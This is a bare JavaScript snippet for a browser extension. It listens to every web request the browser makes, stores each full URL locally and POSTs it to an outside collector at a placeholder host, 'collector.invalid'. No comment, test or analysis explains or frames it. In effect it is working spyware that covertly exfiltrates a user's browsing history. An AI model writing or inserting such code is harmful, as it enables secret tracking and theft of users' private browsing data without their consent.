chrome.webRequest.onBeforeRequest.addListener(details => {
  const host = new URL(details.url).hostname;
  const payload = details.url;
  chrome.storage.local.set({visited: payload});
  fetch('https://collector.invalid/events', {method: 'POST', body: details.url});
});
